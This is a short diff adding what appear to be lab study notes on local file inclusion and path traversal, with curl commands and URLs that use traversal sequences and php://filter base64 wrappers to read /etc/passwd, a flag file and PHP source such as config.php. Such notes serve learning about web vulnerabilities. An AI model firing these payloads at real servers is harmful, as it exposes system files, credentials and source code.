@@ -1,0 +1,33 @@
+ File Inclusion / Directory Traversal
+
+    An intro to file inclusion vulnerabilities
+    Local File Inclusion (LFI)
+    Path Traversal
+    Bypassing basic LFI restrictions
+    LFI to remote code execution (RCE)
+    Remote File Inclusion (RFI)
+
+
+Source Code Disclosure via PHP Wrappers
+
+- In this scenario, our only option is to include PHP files and find sensitive information or vulnerabilities in the source code. 
+- Such files can be found by performing a brute force against the webserver for files with a .php extension, using tools such as gobuster, dirbuster, or dirsearch. 
+- Direct inclusion of these PHP files won't return anything, as the server will execute it as code. For example, consider a file named config.php, which is present on the server.
+
+curl 188.166.169.77:31369/index.php?language=..//..//..//..//usr/share/flags/flag.txt
+
+
+http://178.128.164.139:32139/extension/index.php?page=php://filter/read=/resource/etc/passwd/
+
+http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config
+
+curl http://178.128.164.139:32139/index.php?page=php://filter/read=convert.base64-encode/resource=index
+
+/index.php?message=php://filter/read=convert.base64-encode/resource=index
+
+
+http://178.128.164.139:8080/fonts/
+http://178.128.164.139:8080/js/
+http://178.128.164.139:8080/css/
+
+
